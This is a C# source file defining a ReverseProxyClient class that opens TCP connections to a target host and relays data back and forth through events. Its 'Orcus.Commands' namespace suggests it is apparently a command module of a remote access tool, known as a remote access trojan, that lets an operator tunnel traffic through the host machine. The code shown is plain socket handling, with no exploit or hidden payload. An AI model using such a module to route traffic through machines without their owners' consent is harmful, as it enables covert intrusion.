using System;
using System.Net;
using System.Net.Sockets;
using Orcus.Commands.ReverseProxy.Args;

namespace Orcus.Commands.ReverseProxy
{
    public class ReverseProxyClient
    {
        public const int BUFFER_SIZE = 8192;
        private byte[] _buffer;
        private bool _disconnectIsSend;
        private bool _isDisposed;

        public ReverseProxyClient(string target, int port, int connectionId)
        {
            ConnectionId = connectionId;
            Target = target;
            Port = port;
            Socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        public int ConnectionId { get; }
        public Socket Socket { get; }
        public string Target { get; }
        public int Port { get; }

        public event EventHandler<ReverseProxyStatusUpdatedEventArgs> ResponseStatusUpdate;
        public event EventHandler<ReverseProxyDataReceivedEventArgs> DataReceived;
        public event EventHandler<ReverseProxyEventArgs> Disconnected;

        public void Initialize()
        {
            //Non-Blocking connect, so there is no need for a extra thread to create
            Socket.BeginConnect(Target, Port, HandleOnConnect, null);
        }

        private void HandleOnConnect(IAsyncResult ar)
        {
            try
            {
                Socket.EndConnect(ar);
            }
            catch
            {
                // ignored
            }

            if (_isDisposed)
                return;

            if (Socket.Connected)
            {
                try
                {
                    _buffer = new byte[BUFFER_SIZE];
                    Socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
                }
                catch
                {
                    ResponseStatusUpdate?.Invoke(this,
                        new ReverseProxyStatusUpdatedEventArgs(ConnectionId, false, null, 0, Target));
                    Disconnect();
                }

                IPEndPoint localEndPoint = (IPEndPoint) Socket.LocalEndPoint;
                ResponseStatusUpdate?.Invoke(this,
                    new ReverseProxyStatusUpdatedEventArgs(ConnectionId, true, localEndPoint.Address, localEndPoint.Port,
                        Target));
            }
            else
            {
                ResponseStatusUpdate?.Invoke(this,
                    new ReverseProxyStatusUpdatedEventArgs(ConnectionId, false, null, 0, Target));
            }
        }

        private void AsyncReceive(IAsyncResult ar)
        {
            //Receive here data from e.g. a WebServer

            try
            {
                int received = Socket.EndReceive(ar);

                if (_isDisposed)
                    return;

                if (received <= 0)
                {
                    Disconnect();
                    return;
                }

                byte[] payload = new byte[received];
                Array.Copy(_buffer, payload, received);

                DataReceived?.Invoke(this, new ReverseProxyDataReceivedEventArgs(ConnectionId, payload));
            }
            catch
            {
                Disconnect();
                return;
            }

            try
            {
                Socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch
            {
                Disconnect();
            }
        }

        public void Disconnect()
        {
            if (_isDisposed)
                return;

            _isDisposed = true;

            if (!_disconnectIsSend)
            {
                _disconnectIsSend = true;
                //send to the Server we've been disconnected
                Disconnected?.Invoke(this, new ReverseProxyEventArgs(ConnectionId));
            }

            try
            {
                Socket.Close();
            }
            catch
            {
                // ignored
            }
        }

        public void SendToTargetServer(byte[] data, int index, int length)
        {
            try
            {
                Socket.Send(data, index, length, SocketFlags.None);
            }
            catch
            {
                Disconnect();
            }
        }
    }
}